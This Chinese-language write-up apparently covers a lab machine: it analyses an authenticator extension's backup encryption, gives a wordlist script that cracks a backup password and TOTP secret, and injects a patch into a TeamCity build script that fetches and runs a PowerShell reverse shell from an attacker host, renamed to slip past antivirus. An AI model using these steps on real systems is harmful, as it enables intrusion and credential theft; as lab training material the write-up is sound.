<p>由此可以得知，keepass库中的那个json就是这个被加密的凭据。</p>
<p>翻他的源码仓库中对于backup导入加密部分的处理</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/Authenticator-Extension/Authenticator/blob/dev/src/import.ts">https://github.com/Authenticator-Extension/Authenticator/blob/dev/src/import.ts</a></p>
</blockquote>
<p>如下</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">decryptBackupData</span>(<span class="params"></span></span><br><span class="line"><span class="params">  backupData: &#123; [hash: <span class="built_in">string</span>]: OTPStorage | Key &#125;,</span></span><br><span class="line"><span class="params">  passphrase: <span class="built_in">string</span> | <span class="literal">null</span></span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">decryptedBackupData</span>: &#123; [<span class="attr">hash</span>: <span class="built_in">string</span>]: <span class="title class_">RawOTPStorage</span> &#125; = &#123;&#125;;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">keys</span>: <span class="title class_">Map</span>&lt;<span class="built_in">string</span>, <span class="built_in">string</span> | <span class="literal">null</span>&gt; = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> hash <span class="keyword">in</span> backupData) &#123;</span><br><span class="line">    <span class="keyword">const</span> unknownStorageItem = backupData[hash];</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      <span class="keyword">typeof</span> unknownStorageItem !== <span class="string">&quot;object&quot;</span> ||</span><br><span class="line">      unknownStorageItem.<span class="property">dataType</span> === <span class="string">&quot;Key&quot;</span></span><br><span class="line">    ) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">storageItem</span>: <span class="title class_">RawOTPStorage</span>;</span><br><span class="line">    <span class="keyword">if</span> (unknownStorageItem.<span class="property">dataType</span> === <span class="string">&quot;EncOTPStorage&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!passphrase) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!keys.<span class="title function_">has</span>(unknownStorageItem.<span class="property">keyId</span>)) &#123;</span><br><span class="line">        keys.<span class="title function_">set</span>(</span><br><span class="line">          unknownStorageItem.<span class="property">keyId</span>,</span><br><span class="line">          <span class="keyword">await</span> <span class="title function_">findAndUnlockKey</span>(</span><br><span class="line">            backupData,</span><br><span class="line">            unknownStorageItem.<span class="property">keyId</span>,</span><br><span class="line">            passphrase</span><br><span class="line">          )</span><br><span class="line">        );</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">const</span> decryptKey = keys.<span class="title function_">get</span>(unknownStorageItem.<span class="property">keyId</span>);</span><br><span class="line">      <span class="keyword">if</span> (!decryptKey) &#123;</span><br><span class="line">        <span class="comment">// wrong password for key</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      storageItem = &#123;</span><br><span class="line">        ...unknownStorageItem,</span><br><span class="line">        ...<span class="title class_">JSON</span>.<span class="title function_">parse</span>(</span><br><span class="line">          <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(unknownStorageItem.<span class="property">data</span>, decryptKey).<span class="title function_">toString</span>(</span><br><span class="line">            <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span></span><br><span class="line">          )</span><br><span class="line">        ),</span><br><span class="line">        <span class="attr">encrypted</span>: <span class="literal">false</span>,</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      storageItem = unknownStorageItem;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!storageItem.<span class="property">secret</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (storageItem.<span class="property">encrypted</span> &amp;&amp; !passphrase) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (storageItem.<span class="property">encrypted</span> &amp;&amp; passphrase) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        storageItem.<span class="property">secret</span> = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(</span><br><span class="line">          storageItem.<span class="property">secret</span>,</span><br><span class="line">          passphrase</span><br><span class="line">        ).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>);</span><br><span class="line">        storageItem.<span class="property">encrypted</span> = <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// storageItem.secret may be empty after decrypt with wrong</span></span><br><span class="line">    <span class="comment">// passphrase</span></span><br><span class="line">    <span class="keyword">if</span> (!storageItem.<span class="property">secret</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    decryptedBackupData[hash] = storageItem;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> decryptedBackupData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中主要解密的部分是这个，通过 <code>storageItem.secret</code>的值与密码做aes解密</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (storageItem.<span class="property">encrypted</span> &amp;&amp; passphrase) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    storageItem.<span class="property">secret</span> = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(</span><br><span class="line">      storageItem.<span class="property">secret</span>,</span><br><span class="line">      passphrase</span><br><span class="line">    ).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>);</span><br><span class="line">    storageItem.<span class="property">encrypted</span> = <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>storageItem.secret</code> 的 <code>storageItem</code> 则是由如下赋值</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">      storageItem = unknownStorageItem;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><code>unknownStorageItem</code> 是由 <code>backupData</code> 中的 <code>hash</code> key赋值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for (const hash in backupData) &#123;</span><br><span class="line">    const unknownStorageItem = backupData[hash];</span><br><span class="line">    if (</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>而 <code>backupData</code> 与 <code>passphrase</code> 由外部传入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export async function decryptBackupData(</span><br><span class="line">  backupData: &#123; [hash: string]: OTPStorage | Key &#125;,</span><br><span class="line">  passphrase: string | null</span><br><span class="line">) </span><br></pre></td></tr></table></figure>

<p>查看调用</p>
<p>于两处有调用</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/Authenticator-Extension/Authenticator/blob/9d9660bb73700b3e725800edc22836662d94afac/src/components/Import/FileImport.vue#L105">https://github.com/Authenticator-Extension/Authenticator/blob/9d9660bb73700b3e725800edc22836662d94afac/src/components/Import/FileImport.vue#L105</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/Authenticator-Extension/Authenticator/blob/9d9660bb73700b3e725800edc22836662d94afac/src/components/Import/TextImport.vue#L84">https://github.com/Authenticator-Extension/Authenticator/blob/9d9660bb73700b3e725800edc22836662d94afac/src/components/Import/TextImport.vue#L84</a></p>
</blockquote>
<p>调用形式一样，这里挑 <a target="_blank" rel="noopener" href="https://github.com/Authenticator-Extension/Authenticator/blob/9d9660bb73700b3e725800edc22836662d94afac/src/components/Import/FileImport.vue#L105"><code>FileImport.vue</code></a> 看</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">key</span>: &#123; <span class="attr">enc</span>: <span class="built_in">string</span> &#125; | <span class="literal">null</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (importData.<span class="title function_">hasOwnProperty</span>(<span class="string">&quot;key&quot;</span>)) &#123;</span><br><span class="line">  <span class="keyword">if</span> (importData.<span class="property">key</span>) &#123;</span><br><span class="line">    key = importData.<span class="property">key</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">delete</span> importData.<span class="property">key</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (importData.<span class="property">enc</span> &amp;&amp; importData.<span class="property">hash</span>) &#123;</span><br><span class="line">  key = &#123; <span class="attr">enc</span>: importData.<span class="property">enc</span> &#125;;</span><br><span class="line">  <span class="keyword">delete</span> importData.<span class="property">hash</span>;</span><br><span class="line">  <span class="keyword">delete</span> importData.<span class="property">enc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> hash <span class="keyword">in</span> importData) &#123;</span><br><span class="line">  <span class="keyword">const</span> possibleEntry = importData[hash];</span><br><span class="line">  <span class="keyword">if</span> (possibleEntry.<span class="property">dataType</span> === <span class="string">&quot;Key&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// don&#x27;t try to import keys as an OTPEntry</span></span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (possibleEntry.<span class="property">keyId</span> || possibleEntry.<span class="property">encrypted</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="attr">oldPassphrase</span>:</span><br><span class="line">        | <span class="built_in">string</span></span><br><span class="line">        | <span class="literal">null</span> = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">getOldPassphrase</span>();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (key) &#123;</span><br><span class="line">        <span class="comment">// v2 encryption</span></span><br><span class="line">        decryptedFileData = <span class="keyword">await</span> <span class="title function_">decryptBackupData</span>(</span><br><span class="line">          importData,</span><br><span class="line">          <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(key.<span class="property">enc</span>, oldPassphrase).<span class="title function_">toString</span>()</span><br><span class="line">        );</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// v3 and v1 encryption</span></span><br><span class="line">        decryptedFileData = <span class="keyword">await</span> <span class="title function_">decryptBackupData</span>(</span><br><span class="line">          importData,</span><br><span class="line">          oldPassphrase</span><br><span class="line">        );</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>检查引入数据中是否包含 <code>key</code> 这个属性，这里我们手里的导出备份是有这个属性的</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (importData.<span class="title function_">hasOwnProperty</span>(<span class="string">&quot;key&quot;</span>)) &#123;</span><br><span class="line">  <span class="keyword">if</span> (importData.<span class="property">key</span>) &#123;</span><br><span class="line">    key = importData.<span class="property">key</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;6132e897-44a2-4d14-92d2-12954724e83f&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    ...</span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    ...</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>当我们导入的加密凭据包含key时，便会调用到 <code>v2 encryption</code> 路径的 <code>decryptBackupData</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (key) &#123;</span><br><span class="line">  // v2 encryption</span><br><span class="line">  decryptedFileData = await decryptBackupData(</span><br><span class="line">    importData,</span><br><span class="line">    CryptoJS.AES.decrypt(key.enc, oldPassphrase).toString()</span><br><span class="line">  );</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  // v3 and v1 encryption</span><br><span class="line">  decryptedFileData = await decryptBackupData(</span><br><span class="line">    importData,</span><br><span class="line">    oldPassphrase</span><br><span class="line">  );</span><br></pre></td></tr></table></figure>

<p>有趣的是这里 <code>passphrase</code> 位置他先做了一次解密之后再传入的。</p>
<p>也就是说脚本要撞他密码需要 先把密码拿来 <code>key.enc</code> 进行aes解密，然后再用得到的值拿去跟 <code>hash.secret</code> 做一次aes，最后便是结果，通过自定义导入时候的手动测试得知secert应当是16位以上，由数字或大写字母组成，小写不认。</p>
<p>跑密码的如下，写的有点拉跨让gpt帮忙格式化了一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">const fs = require(&quot;fs&quot;);</span><br><span class="line">const CryptoJS = require(&quot;crypto-js&quot;);</span><br><span class="line"></span><br><span class="line">const secret = &quot;U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2&quot;;</span><br><span class="line">const enc = &quot;U2FsdGVkX19dvUpQDCRui5XaLDSbh9bP00/1iBSrKp7102OR2aRhHN0s4QHq/NmYwxadLeTN7Me1a3LrVJ+JkKd76lRCnd1utGp/Jv6w0hmcsqdhdccOpixnC3wAnqBp+5QyzPVaq24Z4L+Rx55HRUQVNLrkLgXpkULO20wYbQrJYN1D8nr3g/G0ukrmby+1&quot;;</span><br><span class="line"></span><br><span class="line">const wordlistPath = process.argv[2];</span><br><span class="line">const wd = fs.readFileSync(wordlistPath, &quot;utf-8&quot;).split(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">for (const wdl of wd) &#123;</span><br><span class="line">  const pass = wdl.trim();</span><br><span class="line">  try &#123;</span><br><span class="line">    const importpass = CryptoJS.AES.decrypt(enc, pass).toString();</span><br><span class="line">    if (!importpass) continue;</span><br><span class="line">    const result = CryptoJS.AES.decrypt(secret, importpass).toString(CryptoJS.enc.Utf8);</span><br><span class="line">    if (result.length &gt;= 16) &#123;</span><br><span class="line">      console.log(&quot;✅ 找到有效口令！&quot;);</span><br><span class="line">      console.log(`🔑 Password: $&#123;pass&#125;`);</span><br><span class="line">      console.log(`🔓 Key: $&#123;importpass&#125;`);</span><br><span class="line">      console.log(`📦 Raw result (hex): $&#123;result&#125;`);</span><br><span class="line">      console.log(`🧬 Decoded seed: $&#123;seed&#125;`);</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; catch (err) &#123;</span><br><span class="line">    continue;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跑了一会得到保护密码 <code>skyblade</code> 以及secert <code>PM2CG6RO73QT74WS</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ node test.js /usr/share/wordlists/rockyou.txt</span><br><span class="line">✅ 找到有效口令！</span><br><span class="line">🔑 Password: skyblade</span><br><span class="line">🔓 Key: 3a3c2614b17654f9f15dce9dd282955e4f82e32dd0397fbb5b6730354a3dc6a7465091e1bea6fd465aa83743fbd9e630c9dff2c461da26737dc693d0d88623129b7c1a9342d0c88b406d7d542d4414ee4f13ee3e127d9ed0a124773d66e8af460d4347e3551dace0299452b898cc01396c6c4cc8ab967cad</span><br><span class="line">📦 Raw result (hex): PM2CG6RO73QT74WS</span><br></pre></td></tr></table></figure>

<p>因为是TOTP，所以还需要与服务器时间同步。</p>
<p>这里和之前一个 <code>totp</code> 靶机一样的思路，curl获取web返回的服务器时间，然后date应用时间</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">date</span> -s <span class="string">&quot;<span class="subst">$(curl 10.10.11.207 -sI|awk -F &#x27;: &#x27; &#x27;NR==8 &#123;print $2&#125;&#x27;)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>这个账户没有直接创建任务的权限，只能对现有任务做操作</p>
<p><img src="https://image.baidu.com/search/down?url=http://tvax4.sinaimg.cn/mw690/0065CzJOly1i3bewxe3zpj31b70ls7fa.jpg" alt="image"></p>
<p>直接run能看到输出了一个 <code>hello world</code> ，文件名有些眼熟，返回去看了下smb里的文件，有点像但不能完全确定。</p>
<p>这里没有权限在run的过程中直接 pipeline 附加command。</p>
<p>只有这部分的内容可以编辑，或者说自定义。</p>
<p><img src="https://image.baidu.com/search/down?url=http://tvax2.sinaimg.cn/mw690/0065CzJOly1i3bezuh9v5j30ui0c741q.jpg" alt="image"></p>
<p>这里说让上传一个patch或者diff格式的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Click to upload or drag &amp; drop a patch in unified diff format</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.jetbrains.com/help/teamcity/personal-build.html#Direct+Patch+Upload">https://www.jetbrains.com/help/teamcity/personal-build.html#Direct+Patch+Upload</a></p>
</blockquote>
<p>这功能相比于分支再单独构建会更灵活一些。</p>
<p>因为run之后会执行 <code>hello_world.ps1</code> 进行一个简单的输出。</p>
<p>所以这里考虑patch他的这个脚本来尝试命令执行。</p>
<p>这里我需要创建一个和他同名的文件来patch他，但是我不知道他具体文件内容.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vim hello_world.ps1</span><br><span class="line"></span><br><span class="line">git init </span><br><span class="line"></span><br><span class="line">git commit -m <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">└─$ git <span class="built_in">log</span>           </span><br><span class="line">commit 8522a4ca5c91eb8c387a35c7c2839448fee712b1 (HEAD -&gt; master)</span><br><span class="line">Author: <span class="built_in">test</span> &lt;<span class="built_in">test</span>@flower&gt;</span><br><span class="line">Date:   Tue Jul 8 13:41:21 2025 -0400</span><br><span class="line"></span><br><span class="line">    <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p>简单改了下，diff之后丢上去 run 了下，就报错了</p>
<p><img src="https://image.baidu.com/search/down?url=http://tvax4.sinaimg.cn/mw690/0065CzJOly1i3bfbhtle0j30bs02rgm7.jpg" alt="image"></p>
<p>翻看了下执行时候的报错</p>
<p><img src="https://image.baidu.com/search/down?url=http://tvax1.sinaimg.cn/mw690/0065CzJOly1i3bfcafuqbj31c10jl46t.jpg" alt="image"></p>
<p>看右侧报错能确定是diff文件没有成功被应用，因为我diff的 <code>ps1</code> 内容是乱写的，所以第一版的diff无法被应用，不过现在左侧能看到具体的文件内容，和smb里的一样。</p>
<p><img src="https://image.baidu.com/search/down?url=http://tvax3.sinaimg.cn/mw690/0065CzJOly1i3bfcrb7dhj31rs0ddjyf.jpg" alt="image"></p>
<p>得知具体文件内容，就可以正常进行diff了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cat</span> hello_world.ps1 </span><br><span class="line"><span class="comment">#Simple repo test for Teamcity pipeline</span></span><br><span class="line">write-host <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line"></span><br><span class="line">git init             </span><br><span class="line"></span><br><span class="line">git add hello_world.ps1</span><br><span class="line"></span><br><span class="line">git commit -m <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p>改一下，生成一下 diff</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ git diff hello_world.ps1</span><br><span class="line">diff --git a/hello_world.ps1 b/hello_world.ps1</span><br><span class="line">index 09724d2..c8975e2 100644</span><br><span class="line">--- a/hello_world.ps1</span><br><span class="line">+++ b/hello_world.ps1</span><br><span class="line">@@ -1,2 +1,4 @@</span><br><span class="line"> <span class="comment">#Simple repo test for Teamcity pipeline</span></span><br><span class="line"> write-host <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">+</span><br><span class="line">+curl 10.10.16.9</span><br><span class="line"></span><br><span class="line">git diff hello_world.ps1 &gt; test.diff</span><br></pre></td></tr></table></figure>

<p>此时再次上传diff ，然后 run </p>
<p><img src="https://image.baidu.com/search/down?url=https://image.baidu.com/search/down?url=http://tvax3.sinaimg.cn/mw690/0065CzJOly1i3bffwn21hj31340m7djh.jpg" alt="image"></p>
<p>这次没有报错并且成功收到了请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.10.11.207 - - [08/Jul/2025 13:59:25] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p>修改拿一下revhshell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ git diff                            </span><br><span class="line">diff --git a/hello_world.ps1 b/hello_world.ps1</span><br><span class="line">index 09724d2..bb73e8f 100644</span><br><span class="line">--- a/hello_world.ps1</span><br><span class="line">+++ b/hello_world.ps1</span><br><span class="line">@@ -1,2 +1,4 @@</span><br><span class="line"> <span class="comment">#Simple repo test for Teamcity pipeline</span></span><br><span class="line"> write-host <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">+</span><br><span class="line">+IEX(iwr http://10.10.16.9/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.9 -Port 10086</span><br></pre></td></tr></table></figure>

<p>上传之后 run，被淦了，看报错是有df</p>
<p><img src="https://image.baidu.com/search/down?url=http://tvax2.sinaimg.cn/mw690/0065CzJOly1i3bfi5ab85j312l0eynad.jpg" alt="image"></p>
<p>简单改下脚本再次上传。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ git diff            </span><br><span class="line">diff --git a/hello_world.ps1 b/hello_world.ps1</span><br><span class="line">index 09724d2..16f77a7 100644</span><br><span class="line">--- a/hello_world.ps1</span><br><span class="line">+++ b/hello_world.ps1</span><br><span class="line">@@ -1,2 +1,4 @@</span><br><span class="line"> #Simple repo test for Teamcity pipeline</span><br><span class="line"> write-host &quot;Hello, World!&quot;</span><br><span class="line">+</span><br><span class="line">+IEX(iwr http://10.10.16.9/Invoke-aa.ps1 -UseBasicParsing);Invoke-aa -Rv -IA 10.10.16.9 -PP 10086</span><br></pre></td></tr></table></figure>

<p><img src="https://image.baidu.com/search/down?url=http://tvax2.sinaimg.cn/mw690/0065CzJOly1i3bfkgvj66j30yr0e7gp6.jpg" alt="image"></p>
<p>拿到 svc_teamcity shell </p>
